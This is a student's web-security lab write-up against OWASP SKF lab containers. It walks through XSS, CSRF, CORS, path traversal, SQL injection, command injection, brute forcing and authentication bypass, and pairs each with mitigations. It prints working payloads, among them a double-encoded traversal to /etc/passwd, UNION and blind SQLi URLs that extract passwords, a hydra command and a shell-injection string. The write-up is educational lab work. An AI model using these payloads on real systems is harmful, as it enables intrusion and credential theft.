###### tags: `AS`
:::success
# AS Lab 2 Assignment: Web Security
**Name: Radomskiy Ilia**
:::

---

## Cross site scripting

### Enviroment

`XSS` is a exploitation of vulnerable web application in order to inject mode code\script in it. Exploitation is working when attacked is injects browser executable code within a single HTTP response

### Exploit

1. On 1 run we just inspect what kind of output we will get with this input form:

Input: 
```java=
string
```
Output: 
```java=
<p style="font-size:2em;">string</p>
```

<center>

![](https://i.imgur.com/lBJocsW.png)
    
</center>

2. Now we can go a little bit further and try add `next line` in code

Input: 
```java=
string"></
```
Output: 
```java=
<p style="font-size:2em;">
    string">
    <!--/p-->
```

<center>

![](https://i.imgur.com/XK3hvTq.png)
    
</center>

3. Script time, by entering `<script>alert("Hello_SNE")</script>` in new line we can get this message back

Input: 
```java=
string"><script>alert("Hello_SNE")</script>
```
Output: 
```java=
<p style="font-size:2em;">
    string">
    <script>alert("Hello_SNE")</script>
    </p>
```

<center>

![](https://i.imgur.com/7GQwIwg.png)
    
![](https://i.imgur.com/V6pnzqM.png)

</center>


### Fixing

Several mechanism can be applied in order to avoid such attack
* * Input validation - all input should be validated if you ask for numbers, receive only numbers
* * Output encoding/escaping - main reason conversation of dangerous characters
* * Security Headers - Browser embedded security like `X-XSS-Protection`
* * Use of modern front end - updated versions of software becoming subject to attack in less about of cases
* HTTPOnly Cookie attribute - cookies are not allowed to be read, and stolen from the browser
[1]


---

## Cross site scripting (attribute)

### Enviroment

Similar to the previous one, but this time we changing attributes of the text

### Exploit

1. On 1 run we just inspect what kind of output we will get with this input form:

Input: 
```java=
green
```
Output: 
```java=
<span style="color:green;"> Let me be a new color!</span>
```

<center>

![](https://i.imgur.com/KnGHPTq.png)

    
</center>

2. Now we can add `onmouseover` in order to make a window pop up, when the user is we can go a little bit further and try add `next line` in code

Input: 
```java=
blue ' onmouseover='alert("Hello_SNE")'
```
Output: 
```java=
<span style="color:blue " onmouseover="alert(&quot;Hello_SNE&quot;)" ;'=""> Let me be a new color!</span>
```

<center>

![](https://i.imgur.com/e0kDE93.png)
</center>

And, when the mouse is on the text with the changed attribute

<center>
    
![](https://i.imgur.com/tjTke0g.png)
    
</center>

### Fixing

Mechanism for prevention is same as previous one:
 * Input validation - all input should be validated if you ask for numbers, receive only numbers
 * Output encoding/escaping - main reason conversation of dangerous characters
 * Security Headers - Browser embedded security like `X-XSS-Protection`
 * Use of modern front end - updated versions of software becoming subject to attack in less about of cases
* HTTPOnly Cookie attribute - cookies are not allowed to be read, and stolen from the browser

---

## Cross site scripting (href)

### Enviroment

`href` is used for the redirection to the another resource. And this stand is asking for the `URL`. But exploitation is the same `Cross site scripting`

### Exploit 

1. I will enter `yandex.ru` `URL` for this strand

Input: 
```java=
https://yandex.ru/
```
Output: 
```java=
<a style="font-size:20px;" href="https://yandex.ru/">visit my website!</a>
```

<center>

![](https://i.imgur.com/CqtREtR.png)
    
</center>

2. Now, we can insert our payload into this form in order to exploit `xss` of this `href`

Input: 
```java=
javascript:alert('SNE_Hello')
```
Output: 
```java=
<a style="font-size:20px;" href="javascript:alert('SNE_Hello')">visit my website!</a>
```

<center>

![](https://i.imgur.com/ny5tOjL.png)
    
</center>

### Fixing

Additionally to the similar migitations from the previous exploits, you can Use whitelisted protocol like HTTPS or others, whe recieving URL
[2]


## CSS Injection

### Enviroment

`CSS injection` it is ability to inject CSS code in input form of the web resource. This exploitation gives us ability to execute code.

### Exploit 

1. I will enter `green` colour in the form

Input: 
```java=
green
```
Output: from the entering `green` color

<center>

![](https://i.imgur.com/Gn46WHO.png)
 
</center>

And the `color` set string is on the HTML web page

<center>

![](https://i.imgur.com/lkeFsJ6.png)

</center>

2. Now, from the pictures above we understand that, the web resource is exploitable, and we can inject the `)</style><script>alert("malicious URL ")</script>` malicious string with.

Input: 
```java=
blue;)</style><script>alert("malicious URL ")</script>
```
Output: 
```htmlmixed=
p.colorful {
		color: blue;)</style><script>alert("malicious URL")</script>;
	    }
        </style>
```

<center>

![](https://i.imgur.com/SgQgoOs.png)

</center>

HTML code of the web application with the injected  script

<center>

![](https://i.imgur.com/qdoabJU.png)

</center>

### Fixing

Mechanism for prevention of this exploit:
* * Input canonicalization - all input should be validated if you ask for numbers, receive only numbers
* * Entry encoding\aggressive encoding - main reason conversation of dangerous characters
* * String validation - implemented things like `CSS Hex encoding` or others
* * quote Java variables with `\` or `\`- this will save you from the its execution
* HTTPOnly Cookie attribute - cookies are not allowed to be read, and stolen from the browser

## XSSI

### Enviroment

For this exploit is will pull docker container and run it, this is container with vulnerable server.
`XSS` using `script` resource ot the server in order to inject script and execute it.

```shell=
sudo docker pull blabla1337/owasp-skf-lab:untrusted-sources-js
sudo docker run -ti -p 127.0.0.1:5000:5000 docker.io/blabla1337/owasp-skf-lab:untrusted-sources-js
```

### Exploit 

First, we need to set up our attacker environment. It will consist of `python` code and `java` payload

<center>

![](https://i.imgur.com/kbYg97h.png)
python flask server
![](https://i.imgur.com/3hSKj07.png)
payload
</center>

After container is running  we can see working server

<center>

![](https://i.imgur.com/h6Dty1x.png)
    
</center>

When we accessing it we are getting this message

<center>

![](https://i.imgur.com/0itsQ4K.png)
    
</center>

Now lets run script, this script generates `GET` request with `java` script in it.

<center>

![](https://i.imgur.com/DV4T0Uw.png)
    
</center>

Boom, now we got our message from the `java` payload

<center>
    
![](https://i.imgur.com/FcY2bNm.png)
    
</center>

This is output of the `python` server. 

<center>

![](https://i.imgur.com/G3UDkus.png)
    
</center>


### Fixing

Most of the XSS attacks are prevented by browsers
But entries points especially `JASON`are better to be sanitized and being taken care off.

Set a correct `Content-Type` to prevent XSS inside of `X-Content-Type-Options: nosniff`

[3]

---

## Cross site request forgery

and 2 of the following exploits are close to each other so i will put same description on all of them

### Enviroment

`CSRF` or `XSRF` this exploit tricks browser to execute action, often malicious. This often happened during authorization. Main reason for this is to force user to use another web page.

### Exploit 

main page of web application is shown on the picture

<center>

![](https://i.imgur.com/6NvoDqt.png)
    
</center>

When we try to input our data in the form we are getting `POST` request on server. Now we are looking on the color section in the end of this exploit we will change it with the 

<center>

![](https://i.imgur.com/o6R5hDn.png)

</center>

Now we can change this value with `XSSI`. for that we create attack server and send update `POST` request from it.
Code below will overwrite the code on the original web page.

<center>

![](https://i.imgur.com/vDFGDbM.png)

</center>

After entering malicious address with dangerous server we already have started process of updating

<center>

![](https://i.imgur.com/dWq1rQu.png)
    
</center>


Now, waiting for 5 seconds and original web page was overwritten
On the picture you can see `POST` request

<center>

![](https://i.imgur.com/vODqVCy.png)

</center>

Changed value visible on the picture

<center>

![](https://i.imgur.com/C0ZpffX.png)
    
</center>

### Fixing

Possible methods avoidance and mitigation

Using secret cookies or make them doubled - session identifier is not enough, so additional mechanism is required like `SameSite Cookie` 
Use strong tokens
Check activities before execution
Chain up user and session

## Cross site request forgery (same site)

### Enviroment

`CSRF` or `XSRF` this exploit tricks browser to execute action, often malicious. This often happened during authorization. Main reason for this is to force user to use another web page.

### Exploit 

1. This main page is different because there are three methods of the entering on this web resource, lets start with we first one. Simplest one

<center>

![](https://i.imgur.com/q8bTg4S.png)
    
</center>

By entering `red` value in form we and intercepting traffic we can see `POST` request, and also its content

<center>

![](https://i.imgur.com/fBO7bQb.png)
    
</center>

By running attack server we can generate `POST` request to the server and change `red` string
Traffic Interception is show on the picture below.

<cente>

![](https://i.imgur.com/Nofkcip.png)
    
</cente>


Now, string have changed, because browsing allow to do action without authorization. We will improve it with the adding action and checks with cookies

<center>

![](https://i.imgur.com/2HzUPIs.png)
    
</center>

2. Second option and first security mechanism is `Same Site cookie` attribute
As we can see, `POST` action of the original browser contain cookie 

<center>

![](https://i.imgur.com/7jBqGc7.png)
    
</center>

But `POST` request of the attack server is not, that is why there is no change in sting

<cenetr>

![](https://i.imgur.com/xu2OBRX.png)
    
</cenetr>

That is why message have not changed

3. Another way to secure your web app from such attacks is `secure Lax mode`
If we try same attack we are not able to change string of the original web page, with the same reason - no cookies

<center>

![](https://i.imgur.com/wYptobK.png)
    
</center>

But, the weakness of this method is `GET` request. If we will perform attack with the `GET` request we are able to inject code

<center>

![](https://i.imgur.com/XKPytut.png)
    
![](https://i.imgur.com/LY9XTCk.png)
    
</center>



### Fixing

Possible methods avoidance and mitigation

Using secret cookies or make them doubled - session identifier is not enough, so additional mechanism is required like `SameSite Cookie` 
Use strong tokens
Check activities before execution
Chain up user and session

## Cross site request forgery weak

### Enviroment

`CSRF` or `XSRF` this exploit tricks browser to execute action, often malicious. This often happened during authorization. Main reason for this is to force user to use another web page.
### Exploit 

1. At the start we are having simple authorization page and the page with the tag `color` changing page.

<center>
    
![](https://i.imgur.com/JiB5QHH.png)
![](https://i.imgur.com/tnSLC2x.png)
![](https://i.imgur.com/jjYcdmq.png)
    
</center>

Small investigation on the gives as such data

Intercepting the `POST` request we can see, that web app is using token `csrf_token`

<center>

![](https://i.imgur.com/c3O9UVN.png)
token on the chrome debbuger
    
![](https://i.imgur.com/N2jd41j.png)
token in post request
</center>

vaue of it is `YWRtaW4xMzo0Ng%3D%3D` and it can be decoded as
`admin13:46`

With this information we can steal this token and redirect it to our server. We can start it with the script.

After new connection to the server we can see malicious server successfully intercepted connection and have stolen the token.

<center>

![](https://i.imgur.com/mREuUZj.png)
Working malicious server
</center>

<center>

![](https://i.imgur.com/W908fA6.png)
Original server have received message about the token
</center>

### Fixing

Possible methods avoidance and mitigation

Using secret cookies or make them doubled - session identifier is not enough, so additional mechanism is required like `SameSite Cookie` 
Use strong tokens
Check activities before execution
Chain up user and session

[4]

## Clickjacking

### Enviroment

`Clickjacking` - allows to the malicious web page to catch user click on something without user intention.

### Exploit 

In the example we can see button with the teasing text, but the sizes of this place of the page is strange. We can see, empty rectangular

<center>

![](https://i.imgur.com/fMyVjDP.png)
![](https://i.imgur.com/s6M6CCM.png)
</center>

By showing this hidden part we can see, that it is `Clickjacking` location

<center>

![](https://i.imgur.com/NArTbJT.png)
    
</center>

### Fixing

`Are you sure you want to leave the page` message is one of the methods of the mitigation of this vulnerability
`X-Frame-Options` allow us to not show the page inside a firm with `DENY` option
`Cookie: samesite` is also an option to save user


## Content security policy

### Enviroment

`Content-Security-Policy`'s are used if you need to detect and avoid XSS in your website

### Exploit 

Script is testin is
```java=
<script>alert("exploit");</script>
```

First form is not protected, so we can use XSS attacks in it

<center>
    
![](https://i.imgur.com/PPvZDtZ.png)

</center>

second form is protected, and it is not possible to execute something. Also we are getting warnings about it.
<center>

![](https://i.imgur.com/H7uHvYV.png)
    
</center>

### Fixing

`Content-Security-Policy` is used in order to avoid XSS, packet sniffing,


## CORS exploitation

### Enviroment

`CORS` uses HTTP headers in order to allow  user get information from the server on its agent (webpage). The information is current web page from the original webpage

### Exploit 

After login we can see some important  information. We will be stealing it with `CORS exploitation`

<center>

![](https://i.imgur.com/mP2jgKR.png)

</center>

In order to do that we wished to find line in response packet about `access-control-origin` we can see `wild card` as a value of the parameter. This setting allows to request data from the web page from the `*` user, so to everyone

<center>

![](https://i.imgur.com/bHe86aI.png)
    
</center>

Now start attack server with the sending `get` request to the original server `req.open('get','address of resource', true);`. And display this info in attacker webpage.

As you can see from the `get` request, as origin we are getting `evil` resource. That means attack is successful

<center>

![](https://i.imgur.com/mZctUZy.png)

</center>

And confidential information is displayed on our attack web page

<cetner>

![](https://i.imgur.com/fPiOIEw.png)

</cetner>


### Fixing

Restrict **cross-origin** requests, don't use wildcard, use white list instead

[5]

## Path traversal (LFI)

### Enviroment

`LFI` - Local file inclusion, this exploit allow attackers to read local information from the server by sending unupropriate request to the server. 

### Exploit

On the main page of exploitable web page we can see some of the select options

<center>

![](https://i.imgur.com/9G0vAgj.png)
    
</center>

By finding them in the web browser debbuger of the HTML page we can change value of the input is select option

<center>

![](https://i.imgur.com/IuSgkox.png)
    
</center>

By changing it to the `../../../../../etc/passwd` we can get sensitive information back to the web page. IN response section we can see whole file of `/etc/passwd`
It is also possible to use this exploit with the HTML request `http://example.com/index.php?file=../../../../../etc/passwd`

<center>
    
![](https://i.imgur.com/28csN0P.png)
On the web page
    
![](https://i.imgur.com/dGoGOJo.png)
On the burpsuite
    
</center>

### Fixing

Avoid passing any user data to the system. Or check it before execution.

## Remote file inclusion (harder)

i guess local one

### Enviroment

Local file inclusion it is when attacker getting access to the local file, without proper authority
There is remote version, when attacker is using his own files

### Exploit 

On this web page we can see select window, and by submitting one of them we can  get data from the server

<center>

![](https://i.imgur.com/SDBbx8D.png)
    
</center>

Now, what will happen if we send to the server another execution location instead of the setted one.
Let's try with `/etc/passwd` and of course we set some additional `/../` in order to go back to the root dir

<center>

![](https://i.imgur.com/QXC4cGe.png)
    
</center>

In that way we got an file with all users ot the server

<center>

![](https://i.imgur.com/xe9n94g.png)
    
</center>


### Fixing

Avoid user submission, or if you can't, moderate and sanitize it
[9]

## Remote file inclusion (hard)
i guess local one
### Enviroment

Same as the previous, but harder, because someone has setted up moderation on the user input

### Exploit 

Same web page with select forms

<center>

![](https://i.imgur.com/y4b3i06.png)
    
</center>

But this time it is not allowed to use ../ and other symbols in order to get such valuable information

<cente>

![](https://i.imgur.com/l7tCZa2.png)
    
</cente>

Ok, them, lets play smarter.
We will be using double encoding, in order to avoid filters
```
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

With this we successefuly got you `/etc/passwd` file

<center>

![](https://i.imgur.com/YQ7prDz.png)
</center>

### Fixing

Set stronger filters, and yes, try harder.

## Open redirect

### Enviroment

`URL Redirection` technique used in order to redirect users to another resource. Originally it is not bad thing, but can be used with bad intentions.

### Exploit 

In the web page we can see redirection button. It is used for redirection of user on new resource, but we can construct url that will redirect us to the another web page.

<center>

![](https://i.imgur.com/np4YnJA.png)
    
</center>

This url will redirect us to the `yandex.ru`, instead of new page of the same application

```
https://url-redirection-9b75a0fe-7996-4f26-870d-6878cb587e14.securityknowledgeframework-labs.org/redirect?newurl=https://yandex.ru/
```

On the picture below you can see how differs responses and requests from each other. NOt that much, the only difference is URL to new resource.

<center>

![](https://i.imgur.com/yTsGTxR.png)
Normal redirection
    
![](https://i.imgur.com/cno2mPx.png)
Redirection to another resource
    
</center>

As response we got `302` temporary redirect.


### Fixing

Don't use redirection in chain more than two
Check data on redirection
Use cookies
Ask user if he wants to leave web resource

## Open redirect ( hard )

### Enviroment

Same as the previous, but this time, server administrator is smarter than usual, he added check on the  `.` and `/` in the web page. This technique is often used as mitigation mechanism

### Exploit 

Same as previous we see communication like this

<center>

![](https://i.imgur.com/2nWjxsv.png)
    
</center>

But, similar link is not working.

<center>

![](https://i.imgur.com/hyXr1jZ.png)

</center>

This is simply because there as protection against such links

<center>

![](https://i.imgur.com/HpzYGUX.png)
    
</center>

But it is possible to about  this too, by encoding
```
double encoding
http://url-redirection-harder2-9b75a0fe-7996-4f26-870d-6878cb587e14.securityknowledgeframework-labs.org/redirect?newurl=https:yandex%252eru
```

This way we can avoid this filter and get redirection to `yandex`

<center>

![](https://i.imgur.com/vazSjd6.png)
    
</center>

Another way to avoid this filter is `utf-8` encoding
```
utf-8
http://url-redirection-harder2-9b75a0fe-7996-4f26-870d-6878cb587e14.securityknowledgeframework-labs.org/redirect?newurl=https:yandex%E3%80%82ru
```

<center>

![](https://i.imgur.com/vOuy0az.png)
    
</center>

### Fixing

Check data on redirection
Use cookies
Ask user if he wants to leave web resource
Use sanitizers, and mode addition checks

## Insecure file upload

### Enviroment

When web resource is not secured, it is possible to upload file with malicious payload and hack the system.
Result of this attack can vary. You can even lose your server or sensitive information

### Exploit 

At the beginning we can see upload option.

<center>
    
![](https://i.imgur.com/8V3yiAs.png)
    
</center>

By sending something we can see that web server giving us information about uploadable data.

<center>

![](https://i.imgur.com/pJWbsIy.png)
    
</center>

That means by entering it we can see, what we have downloaded, on the web page, or executed uploaded file

<center>

</center>

If you want to download malicious `exe`, than it is possible to execute it from the web browser

### Fixing

A file upload vulnerability can be prevented by following the below mitigation techniques:

*    Allow only certain file extension
*    Set maximum file size and name length
*    Allow only authorized users
*    Make sure the fetched file from the web is an expected one
*    Keep your website updated
*    Name the files randomly or use a hash instead of user input
*    Block uploads from bots and scripts using captcha
*    Never display the path of the uploaded file

[6]

## Remote file inclusion

### Enviroment

This type of attack target scripted parts of the webpages, like select forms and etc. `Remote file inclusion (RFI)` main goal to use those scripts and redirect them to the malicious resource with code or URL of the attacker
This attack is close to `local file inclusion (LFI)` but in LFI local files are targeted. in `RFI` it is redirection and the execution of code from the remote resource.

### Exploit 

We can see select form on the main page of the web resource

<center>

![](https://i.imgur.com/gUMzbaU.png)
    
</center>

Inspecting request we have found that script are executed from the `text/command.txt`. Lets change this and redirect to the another resource.

<center>

![](https://i.imgur.com/kjTEaWq.png)

</center>

With our evil server running we can set up web resource with some code (mathematical operation in  our example)

By changing value of selected part we can make server redirected to our resource.
IN the picture below you can see request and response of the server on our attack

<center>

![](https://i.imgur.com/m62CXQo.png)
Redirection to our evir resource
    
![](https://i.imgur.com/39slhk4.png)
Original server executes our command
    
</center>


### Fixing

Proper input validation and sanitation can save our day. Such parameters have to be sanitized and checked:
*    GET/POST parameters
 *   URL parameters
 *   Cookie values
 *   HTTP header values

There are and more particular like  Web Application Firewall (WAF), some sort of input checker, dedicated to recognize maliciour inputs.

[7]



## SQLI (union select)

### Enviroment

`SQLI` - code injection attack, used to attack data-driven application. DUring the attack hacker ca dump database  or the data of the users.

### Exploit 

Main page is not interesting for us now. So right at the beginning we start to try some of the SQL injections

<center>

![](https://i.imgur.com/C3IOlGg.png)
    
</center>

For example, try adding `/home/1 `gives us  new web page
```
https://sqli-b6447ae1-c291-4587-bd37-76354d8698cf.securityknowledgeframework-labs.org/home/1
```

<center>

![](https://i.imgur.com/b83Kae6.png)

</center>

The whole process of the SQL injections attack is process of trying to add new symbols in `URL`, with the continuous investigation of responses
Next step to add `'` at the end

```
https://sqli-b6447ae1-c291-4587-bd37-76354d8698cf.securityknowledgeframework-labs.org/home/1'
```

We got an error of adding 1 unexpected symbol

<center>

![](https://i.imgur.com/7pr4HKE.png)
    
</center>

Next, trying to add logical opearion in the query

```
https://sqli-b6447ae1-c291-4587-bd37-76354d8698cf.securityknowledgeframework-labs.org/home/1%20and%201=1
```

This gives us an error, of failure of logical computation

<center>

![](https://i.imgur.com/FS8EYns.png)
    
</center>


we will be using union operator `UNION` to join a query, in such manner we will obtain information and display it on the web page
First in ber of `UNION` is amount of columns
The first try is unsuccessful

```
https://sqli-b6447ae1-c291-4587-bd37-76354d8698cf.securityknowledgeframework-labs.org/home/1%20union%20select%201
```

<center>

![](https://i.imgur.com/W8ybCK0.png)
    
</center>

Now we can add data to display, for this time it will be simple numbers

```
https://sqli-b6447ae1-c291-4587-bd37-76354d8698cf.securityknowledgeframework-labs.org/home/1%20union%20select%201,2,3
```
<center>

![](https://i.imgur.com/HMklsri.png)
    

</center>

At this point we constructed fine URL, and can proceed with the trying to get `username` and `password`

```
https://sqli-b6447ae1-c291-4587-bd37-76354d8698cf.securityknowledgeframework-labs.org/home/1%20UNION%20SELECT%201,%20username,password%20from%20users
```

<center>

![](https://i.imgur.com/L8A8i0t.png)
    
</center>

Finay query retur some results

### Fixing

Object Relational Mappers - do not construct your database as strings, in that way no one can retrieve string from your data base
Web Application Firewalls - popular way for defences
Detection - database firewall can save you from SQL
Parameterized statements - set amount of parameters that can be used in query
Escaping - set restriction on symbols of popular SQL like `'` and `''`

[8]

## SQLI - like

### Enviroment

`SQL` - code injection attack, used to attack data-driven application. This time this is a little bit different angle

### Exploit 

As the previous time first we try to use `union` in order to get info about original query, number of columns

```
http://0.0.0.0:5000//home/Admin%' union select 1--
```
<center>

![](https://i.imgur.com/DBsYtRR.png)
    
</center>

This error tells us that there 2 columns, so change the address

```
http://localhost:5000/home/Admin%' union select 1,2--
```

Now we got username and it email address, from the database

<center>

![](https://i.imgur.com/Aqjp088.png)
    
</center>

Assumption about database provider can give us a possible key to get another piece of information. In the end web application is using `sqlite` so we can use `sqlite_master` if we want to get another information.

```
http://localhost:5000/home/Admin%' union select 1,2 from sqlite_master--
```
We got information about admin user, just like the LInk that can be used on the web page

<center>

![](https://i.imgur.com/ehE72we.png)
    
</center>

`tbl_name` `limit` are keys of the `sqlite` database. They will give us info about table with the personal information

```
http://localhost:5000/home/Admin%' union select tbl_name,sql from sqlite_master limit 1,1--
```

<center>

![](https://i.imgur.com/0fmXXKK.png)
    
</center>

Specifying, what kind of tables we should display will give us some information about secrets in the database

```
http://localhost:5000/home/Admin%' union select UserName,Password from users limit 0,1--
```

<center>

![](https://i.imgur.com/hCzkaSw.png)
    
</center>

### Fixing

Store sensitive information in the protected form
Advices from the previous exploit are useful too 

## SQLI - blind

### Enviroment

Same exploit as previous, but this time we going blind. Usually, there are a lot of methods to automate this process, but for the first time we will do everything manually. Blind type of SQL appears when such a user cannot control the data displayed to the user as a result execution of a vulnerable SQL query.

### Exploit 

First trying, is it possible to SQL this web page or not

```
http://localhost:5000/home/1
```

As we can see, positive reaction

<center>

![](https://i.imgur.com/CmtZWL9.png)

</center>

But in the next query not, then we need to try next SQL technicue `logic operations`

```
http://localhost:5000/home/1'
```

<center>

![](https://i.imgur.com/rPlklKw.png)

</center>

only one test with `logic operations` is successful  `1 OR 1=1`. At this point we know that web application is vulnerable

```
http://localhost:5000/home/1 OR 1=1
http://localhost:5000/home/1 AND 1=2--
```

<center>

![](https://i.imgur.com/GJ9JCaa.png)
![](https://i.imgur.com/plGQ78z.png)

</center>

Next step blindly guess some of the entry points

Queries with the 1,2,3 are valid, but with the 4 is not. That tell us that  pages id's 1,2,3 are valid

```
http://localhost:5000/home/1
http://localhost:5000/home/2
http://localhost:5000/home/3
http://localhost:5000/home/4
```

<center>

![](https://i.imgur.com/tFJTami.png)

</center>

Now we need to add logic to our request. This if statement gives is a structure about the future attack query

```
http://localhost:5000/home/(select case when 1=1 then 1 else 4 end)
```

<center>

![](https://i.imgur.com/7FuIm0w.png)

</center>

Now, since previous step is successful we can start getting info from the database
This query is used to check is the database of user exists

```
http://localhost:5000/home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
```

It is, because there is no error message

<center>

![](https://i.imgur.com/7FuIm0w.png)

</center>

Now, as a part of blind guessing we can start searching users in the database by  their name, for example starting with `a`

```
http://localhost:5000/home/(select case when substr(UserName,1,1)='a' then 1 else 4 end from users limit 0,1)
```

Strange, an error
 
<center>

![](https://i.imgur.com/reQAuAb.png)

</center>

Next try in `A`
```
http://localhost:5000/home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 0,1)
```

And since there is no error, we might suggest that there is user starts with an `A` letter

<center>
    
![](https://i.imgur.com/RVE0yJs.png)

</center>

Lets make an assumption, `Admin`. We can sets our theory by asking server. This time letter `d`. And other letters from our guess

```
http://localhost:5000/home/(select case when substr(UserName,5,1)='d then 1 else 4 end from users limit 0,1)
```

<center>

![](https://i.imgur.com/2Zw8da7.png)

</center>

In that way we got name of the user

### Fixing

Secure Coding Practices is the best practice for any exploit
Automated Testing Solutions also an universal option

## Insecure direct object reference

### Enviroment

`IDOR - Insecure direct object reference` - in simple way revealing of back end through  internal implementation object
 
### Exploit 

This web page allows us to create PDF files, with the data in it. `IDOR` exploit allow us to watch data of the others users

<center>

![](https://i.imgur.com/IHLwzTd.png)
    
</center>

as we can see from request/response communication below. Data travels in the plain text. That is why we can bruteforce it with the burp suite

<center>
    
![](https://i.imgur.com/gsj7Jnd.png)
    
</center>

By brute forcing the web page we can get the data from the other user

<center>

![](https://i.imgur.com/gbsiUgx.png)
Found one strage response
![](https://i.imgur.com/kjbdgUn.png)
Hidden message
</center>


### Fixing

User, and application user cannot access to the some resource, and of course not run as root
Check user input

[10]

## Right to left override attack

### Enviroment


### Exploit 
http://something.com/poc%E2%90%AE4pm.exe

### Fixing


## Rate-limiting

### Enviroment

Rate-limiting technique that not allow to the users ot some resource to send a lot of the requests, so control the flow

### Exploit 

Web page is showing us a login page, but we don't know credentials. But through the analysis we can get metadata of the user.

<center>
    
![](https://i.imgur.com/B6CG6lu.png)

</center>

By decoding it we can get username

```
RGV2ZWxvcGVyIHVzZXJuYW1lOiBkZXZ0ZWFtCkNsaWVudDogUm9ja3lvdQ
```

<center>

![](https://i.imgur.com/tYVSpVB.png)
    
</center>

Now we can brute force the password with hydra, resulted password is `manchesterunited`

```
hydra -l devteam -P rockyou.txt 0.0.0.0 -s 1332 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid"
```

<center>

![](https://i.imgur.com/a9KT5Yb.png)

</center>


### Fixing

Because brute force is succefesul that means we are able to send a lot of request to the server. In that case `Rate-limiting` control the rate of requests is required

## Regex Ddos

### Enviroment

`Regular expression Denial of Service (Reso)` mail weakness of Regex naïve algorithm is analysis or the regular expressions. That is why analysis of `aaaaaaaaaaaaaaaaaaaX` will be equal of checking 65536 possibilities


### Exploit 

This website is simple email checker. If there such characters in the string as located in this sting, then it is a valid email
```
match = re.search(r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$", str(email))
```

<center>
    
![](https://i.imgur.com/GOnugoD.png)
Example of the wrong email
    
![](https://i.imgur.com/dRZqCPv.png)
Example of the succeseful match

</center>

This example is simple and quick one

<center>

![](https://i.imgur.com/7K9oO2v.png)

</center>

But what will happen if there is an input that is too long?
Because of the regular expression analysis it will be a D
OS error, and in some time server is down

<center>

![](https://i.imgur.com/LSzSm3g.png)
    
</center>


### Fixing

Reducing number of combination definitely increase your performance
Control backtracking, if during finding of the match there is no any answer, then return to the previous answer
[11]

## Command injection

### Enviroment

Command injection involves execution on the system shell , or another environment. Attack happens without injection of the malicious code

### Exploit 

By the analysis of the request and response we can see, that parameter is being passed in plain text, so i might change it

<center>

![](https://i.imgur.com/690KI4t.png)
    
![](https://i.imgur.com/LzopiZa.png)

</center>

by injecting our command on server we can get, for example user of the system.

```
150;echo 'whoami' >> templates/index.html
```

<center>

![](https://i.imgur.com/I0sceRx.png)
Command injection
![](https://i.imgur.com/gIfdl8p.png)
Getting result
</center>


### Fixing

Such methods can be used in order to avoid command injection
*    Avoid system calls and user input—to
*    input validation
*    white list—of possible inputs
*    secure API
[12]



## Command injection ( easy )

### Enviroment

This time we are using different type of the filed in order to retrieve information

### Exploit 

This web page is working with logs.

<center>

![](https://i.imgur.com/UnhaCuE.png)
    
</center>


And we can print them

<center>

![](https://i.imgur.com/kDCOjSo.png)
    
</center>

But what will happen if we want to change request access with the command

<center>
    
![](https://i.imgur.com/uqb6yRC.png)

![](https://i.imgur.com/CwYb8Nz.png)
    
</center>


### Fixing

Restrict from execution OS commands directly
Check input of the application

## Command injection ( harder )

### Enviroment

Same as previous we will be executing commands on the server without proper authority, This time attack will be performed with downloading a file

### Exploit 

This web resource is used for the file uploading

<center>

![](https://i.imgur.com/F3IKUMs.png)
    
</center>

Also you can see some of the directories of the server. This gives us a clue about where files stored, and where is stored html page of the website itself

<center>

![](https://i.imgur.com/M8bmgW7.png)

</center>

Information about dirs delivers to us system call. And we can find it by looking at web site debbuger

<center>
    
![](https://i.imgur.com/2z4VEXQ.png)

</center>


With that information, we can upload same web page in different directory with changed system call, and see some personal data

<center>
    
![](https://i.imgur.com/ZWMaucu.png)
    
</center>

After changes have happened we can change directory to `../templates/` with proxy 
As a result we can get information about the users in the system

<center>

![](https://i.imgur.com/NT4Wc4q.png)

</center>

### Fixing

methods like things from the list below can be used in order to mitigate this exploit

*    Avoid system calls and user input—to
*    input validation
*    white list—of possible inputs
*    secure API
* Restrict from execution OS commands directly
* Check input of the application

## Information disclosure 1

### Enviroment

Well, people

### Exploit 

Sometimes we all forgot something

<center>

![](https://i.imgur.com/oAFeAoe.png)
    
</center>

### Fixing

Dont do this

## Information disclosure 2

### Enviroment

Duude, again?

### Exploit 

It is easier to use username and password in the code, but is is dangerous

<center>

![](https://i.imgur.com/jUIDJF8.png)
    
</center>

### Fixing

C'mon, somebody teach him how to use local variables or secrets

## Authentication bypass ( easy )

### Enviroment

Authentication bypass, as stands in the name, gives us, ability to avoid Authentication process, in this example we will do this with cookie generation

### Exploit 

This web page is is generating us a API key

<center>

![](https://i.imgur.com/dGYqEg5.png)
    
</center>

Our attack server will generate cookie string for us. It is possible because we have retrieved secret key from the server code

```
SECRET_KEY= "e5ac-4ebf-03e5-9e29-a3f562e10b22"
```

With the help of this cookie it is possible to change this API value.

<center>

![](https://i.imgur.com/S1cvDNU.png)
    
</center>

Everything have left for us to do, is to change cookie parameters and reload the page
New API key is visible on the picture below

<center>
    
![](https://i.imgur.com/yHPbEGv.png)

</center>

### Fixing

Keep up to date your system
MAke strong auth policy
Not expose your authentification protocols
ID and cookies should be encrypted
Strict limitation on database

## Authentication bypass

### Enviroment

Cookies are used in order to maintain your connection, to make you looked in. This saves you time, but, is it is done not in the secure manner, then it may lead to the problems

### Exploit 

This web page allow us to log in or create user. Lets make one

<center>
    
![](https://i.imgur.com/Yp2T5jw.png)
LOgin page
![](https://i.imgur.com/HAdvzIq.png)

</center>

As we can see, users are authorization with session id, this is cookie. for our user it is sha1 of the `1234`

<center>
    
![](https://i.imgur.com/YOOV4zb.png)
Request and respond during creation 
</center>

In the same manner we will try to create session id for the admin user. sha1 of the `admin = D033E22AE348AEB5660FC2140AEC35850C4DA997`

<center>

![](https://i.imgur.com/IABmNC5.png)
    
</center>

Everything have left is to change cookies and we are logged in

<cennter>

![](https://i.imgur.com/ZE74cCY.png)
Changing cookies    
    
![](https://i.imgur.com/PMSCcZA.png)
Succesefull login
</cennter>

### Fixing

You need to make your session ID as strong as required. As in the example above is not enough.
Use another methods of the protection.
Use salt

## Authentication bypass ( harder )

### Enviroment

